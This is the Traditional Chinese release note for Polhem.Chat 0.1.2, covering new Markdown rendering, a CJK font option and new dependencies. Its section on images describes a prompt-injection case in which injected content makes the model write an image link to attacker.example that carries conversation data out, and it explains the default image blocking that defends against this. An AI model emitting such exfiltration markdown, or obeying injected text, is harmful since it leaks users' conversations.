# Polhem.Chat 0.1.2 — 發佈說明

[English](../../en/changelogs/0.1.2.md)

本檔是 [CHANGELOG.zh-TW.md](../../../CHANGELOG.zh-TW.md) 中 `[0.1.2]` 條目的詳細內容。

這一版把 `Polhem.Chat.Avalonia` 升到 `Polhem.Markdown.Avalonia` 0.2.1。回覆現在可以呈現程式碼上色、數學式、Mermaid
圖表、註腳、GitHub 提示區塊，以及 README 常用的原始 HTML。新版的 Markdown 套件預設會載入圖片，`ChatView` 不沿用這個
預設：回覆裡的圖片要等應用程式明確開啟才會載入。

沒有移除或變更任何公開成員。各類應用程式要處理的事項：

- **想在回覆中顯示圖片的應用程式**：設定 `ChatView.MarkdownOptions`（[回覆不載入圖片](#回覆不載入圖片)）。
- **使用者讀中文或日文的應用程式**：設定 `ChatView.CjkFontFamily`（[中日文粗體](#中日文粗體)）。
- **會檢查依賴、或以裁剪方式發佈的應用程式**：[新增的依賴](#新增的依賴)。

## 新功能與變更

### 回覆能呈現的內容

回覆沿用 `Polhem.Markdown.Avalonia` 0.2 能呈現的內容：依語言上色的程式碼區塊、與 GitHub 相同寫法的數學式（`$…$`、
`$$…$$`）、Mermaid 流程圖與循序圖、註腳、GitHub 提示區塊、刪除線、待辦清單，以及經允許清單過濾、README 常用的 HTML
元素。各項說明見 [Polhem.Markdown 0.2.0 發佈說明](https://github.com/polhem-dev/polhem-markdown/blob/main/docs/zh-TW/changelogs/0.2.0.md)。

### `ChatView.MarkdownOptions`

回覆的檢視器採用的選項：允許的連結 scheme、允許的圖片 scheme、相對連結的基準 URI，以及是否繪製 Mermaid 圖表。預設為
`null`，採用 `MarkdownOptions` 的預設值，但不允許任何圖片 scheme。

### 中日文粗體

`ChatView.CjkFontFamily` 指定回覆中中日韓文字使用的字型家族，例如 `PingFang TC, Microsoft JhengHei UI, Noto Sans CJK TC`。
沒有設定時，因為 Avalonia 挑選備用字型的方式，粗體的中日文字可能以一般字重顯示。預設為 `null`，因為繁中、簡中與日文
同一個字的字形不同，只有應用程式知道使用者讀哪一種。

## 行為變更

### 回覆不載入圖片

回覆是模型寫出的內容。提示注入（例如藏在模型用工具讀到的網頁或文件裡）可以讓模型寫出一張網址夾帶對話資料的圖片：
`![](https://attacker.example/x.png?d=…)`。只要顯示這則回覆，就會載入圖片、把資料送出去。`Polhem.Markdown` 0.2 預設會
載入 `https` 圖片，所以套件內建的回覆 template 從檢視器建立的那一刻起，就給它不允許任何圖片 scheme 的選項：回覆裡的
每張圖片，不論是 Markdown 寫法還是 HTML 的 `img`，都只顯示替代文字。0.1.1 的圖片同樣只顯示替代文字，所以畫面上沒有差別。

應用程式自己為 `AssistantReplyEntry` 註冊的 template 用的是自己的檢視器，`ChatView.MarkdownOptions` 影響不到它。沒有設定
選項的 `MarkdownViewer` 會載入 `https` 圖片，所以這類 template 要自己設定 `Options`，而且要直接給值，不要綁定到 view：
檢視器一拿到文字就會呈現，比綁定到上層元素的 binding 生效得早。

**要怎麼處理**：信任模型輸出、或透過自己控制的代理伺服器載入圖片的應用程式，指定自己的選項。新建的 `MarkdownOptions`
允許 `https` 圖片：

```csharp
Chat.MarkdownOptions = new MarkdownOptions();
```

之後要改選項時請指定新的實例；修改已指定實例裡的集合，不會重建已經顯示的回覆。

### 新增的依賴

透過 `Polhem.Markdown.Avalonia` 0.2，`Polhem.Chat.Avalonia` 現在會帶入 `Svg.Skia` 與 `Avalonia.AvaloniaEdit`。兩者都
不屬於公開 API。各自對 Native AOT 與裁剪的影響見 Polhem.Markdown 的發佈說明。
